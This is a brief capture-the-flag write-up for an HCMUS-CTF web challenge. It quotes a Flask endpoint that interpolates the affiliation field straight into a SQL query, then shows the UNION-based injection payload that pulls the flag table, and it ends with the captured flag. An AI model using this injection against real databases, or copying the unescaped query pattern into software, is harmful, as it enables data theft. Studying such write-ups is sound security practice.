@@ -1,0 +1,37 @@
+The asiaccs web challenge (even though I know nothing about web)
+
+Looking around the source code, I saw the server does not check or escape the value of the affiliation field before using it in an SQL query.
+
+@app.route("/api/search_by_affiliation", methods=["POST"])
+def search_by_affiliation():
+    data = request.json
+    affiliation = data.get("affiliation", "")
+    # Affiliation is directly used in the SQL query without checking
+    query = f"SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%{affiliation}%'"
+    results = db.execute(query).fetchall()
+    # returns results to client
+
+So if I enter a special string, I can inject SQL commands into the original query.
+
+Example:
+
+I enter:
+' UNION SELECT flag, NULL, NULL FROM flag --
+
+The query becomes:
+
+SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%' UNION SELECT flag, NULL, NULL FROM flag --
+
+From there, I can create an exploit.py payload to request the server via /api/search_by_affiliation
+
+Results are returned in POST_res.txt
+
+Well, even though I know nothing about SQL, just getting that table is enough to make me happy.
+
+Now just CTRL + F for HCMUS and filter everything.
+
+Flag is HCMUS-CTF{fake-flag-asiaccs} ....
+
+Just kidding
+Boom
+HCMUS-CTF{vibe-coding_more-jobs-for-pentesters!!} 
